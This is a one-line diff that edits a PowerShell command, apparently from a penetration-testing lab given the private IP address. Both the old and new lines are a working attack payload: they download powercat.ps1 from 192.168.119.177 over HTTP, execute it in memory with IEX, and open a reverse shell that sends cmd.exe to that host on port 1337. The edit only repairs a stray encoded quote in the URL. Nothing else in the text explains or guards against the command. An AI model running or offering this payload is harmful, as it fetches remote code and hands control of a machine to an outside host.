@@ -1,1 +1,1 @@
-powershell -c IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.177:4321/powercat.ps1/%22);powercat -c 192.168.119.177 -p 1337 -e cmd
+powershell -c IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.177:4321/powercat.ps1/);powercat -c 192.168.119.177 -p 1337 -e cmd
